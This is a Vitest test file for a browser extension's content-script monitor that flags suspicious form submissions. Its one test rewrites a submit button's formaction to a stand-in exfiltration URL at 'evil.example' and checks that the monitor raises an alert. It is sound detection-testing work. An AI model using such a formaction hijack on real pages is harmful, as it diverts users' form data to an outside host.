// @vitest-environment happy-dom
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  _resetState,
  initJsBehaviorMonitor,
} from "../extension/src/content/js_behavior_monitor";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;

const testFetch = vi.fn().mockResolvedValue(new Response());
const testXhrOpen = vi.fn();
const testXhrSend = vi.fn();
const testBeacon = vi.fn().mockReturnValue(true);

beforeAll(() => {
  window.fetch = testFetch as unknown as typeof window.fetch;
  XMLHttpRequest.prototype.open =
    testXhrOpen as unknown as typeof XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.send =
    testXhrSend as unknown as typeof XMLHttpRequest.prototype.send;
  navigator.sendBeacon = testBeacon as unknown as typeof navigator.sendBeacon;
});

beforeEach(() => {
  testFetch.mockClear();
  testXhrOpen.mockClear();
  testXhrSend.mockClear();
  testBeacon.mockClear();
  _resetState();
  document.body.innerHTML = "";
});

describe("submitter action baselines", () => {
  it("flags a hostile formaction added to an existing submit control", () => {
    const postSignal = vi.fn<PostSignalFn>();
    document.body.innerHTML = `
      <form action="/safe-endpoint">
        <button type="submit">Continue</button>
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;
    const button = document.querySelector("button") as HTMLButtonElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    button.setAttribute("formaction", "https://evil.example/exfil");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
        destinationOrigin: "https://evil.example",
      })
    );
  });
});
